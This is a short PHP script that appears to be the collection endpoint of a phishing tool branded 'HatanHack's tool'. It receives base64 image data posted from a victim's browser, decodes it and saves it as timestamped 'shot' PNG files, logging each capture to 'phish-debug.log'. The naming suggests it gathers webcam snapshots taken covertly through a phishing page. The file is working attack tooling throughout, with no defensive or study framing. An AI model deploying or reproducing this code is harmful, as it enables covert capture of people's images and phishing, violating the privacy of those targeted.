<?php

// Define date and time for creating a unique filename
$date = date('dMYHis');
$imageData=$_POST['cat'];

// Check if data (image) exists before processing
if (!empty($_POST['cat'])) {
    // Log the reception process in your custom log file
    error_log("Image received successfully by HatanHack's tool at: " . date('Y-m-d H:i:s') . "\r\n", 3, "phish-debug.log");
}

// Remove the data encoding part (base64 header)
$filteredData=substr($imageData, strpos($imageData, ",")+1);

// Decode data from base64
$unencodedData=base64_decode($filteredData);

// Save the data as a PNG image with a unique name (using 'shot' prefix)
$fp = fopen( 'shot'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>
